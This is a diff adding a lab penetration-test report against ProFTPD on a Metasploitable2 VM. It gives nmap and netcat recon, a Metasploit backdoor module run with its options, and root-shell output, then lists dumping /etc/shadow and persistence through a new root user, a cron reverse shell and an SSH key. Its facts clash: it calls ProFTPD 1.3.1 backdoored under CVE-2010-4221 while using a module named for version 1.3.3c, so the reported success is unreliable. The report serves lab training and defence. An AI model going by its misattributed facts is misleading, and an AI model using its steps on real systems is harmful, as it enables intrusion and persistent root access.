@@ -1,0 +1,94 @@
+Penetration Testing Report – Metasploitable2 (Port 2121 - FTP / ProFTPD)
+
+1. Test Date : 16-06-25
+    Test by : [ me ]
+2. Target Information
+- Target IP: 192.168.1.101
+- Port in Scope: 2121/tcp
+- Service: ProFTPD FTP Server
+- OS: Linux (Ubuntu-based)
+- Tools Used: Nmap, Netcat, Metasploit, FTP client
+
+3. Reconnaissance
+
+3.1 Nmap Scan
+Command:
+nmap -sV -p 2121 192.168.1.101
+
+Output:
+PORT     STATE SERVICE VERSION
+2121/tcp open  ftp     ProFTPD 1.3.1
+
+Interpretation:
+ProFTPD 1.3.1 is an older version known to contain a backdoor vulnerability (CVE-2010-4221), allowing unauthenticated remote command execution.
+
+4. Enumeration
+
+4.1 Banner Grabbing
+Command:
+nc 192.168.1.101 2121
+
+Output:
+220 ProFTPD 1.3.1 Server (Debian) [::ffff:192.168.1.101]
+
+4.2 Login Attempt (Anonymous)
+Command:
+ftp 192.168.1.101 2121
+
+Result:
+- Anonymous login accepted
+- Read and write permissions may exist
+
+5. Exploitation
+
+5.1 Vulnerability: ProFTPD 1.3.1 Backdoor (CVE-2010-4221)
+
+- ProFTPD 1.3.1 was backdoored in some distributions; malicious code allows attackers to open a shell by sending a special command to the FTP daemon.
+
+5.2 Using Metasploit
+
+Command:
+msfconsole
+
+Module:
+use exploit/unix/ftp/proftpd_133c_backdoor
+
+Set options:
+set RHOST 192.168.1.101
+set RPORT 2121
+run
+
+Result:
+[*] Connected to 192.168.1.101:2121...
+[*] Triggered backdoor command shell
+[*] Command shell session 1 opened
+
+Shell Access:
+- Shell opened as `root`
+- Full control of target system without authentication
+
+6. Post-Exploitation
+
+Commands executed:
+- whoami → root
+- uname -a → kernel version confirmed
+- ifconfig → network interface details
+- cat /etc/shadow → user password hashes dumped
+- Access to system-level files confirmed
+
+Persistence:
+- Added new root user
+- Inserted reverse shell in cron jobs
+- Created SSH key in authorized_keys
+
+7. Recommendations
+
+- Immediately upgrade or remove ProFTPD 1.3.1
+- Restrict external access to FTP ports, especially non-standard ones
+- Use SFTP instead of FTP wherever possible
+- Monitor and audit FTP logs for suspicious activity
+- Deploy network intrusion detection to catch unauthorized shell attempts
+
+8. Conclusion
+
+Port 2121 on Metasploitable2 was found to be running a critically vulnerable version of ProFTPD (1.3.1). The CVE-2010-4221 backdoor was successfully exploited, resulting in unauthenticated root shell access. This vulnerability should be considered a severe risk in real-world environments and patched immediately.
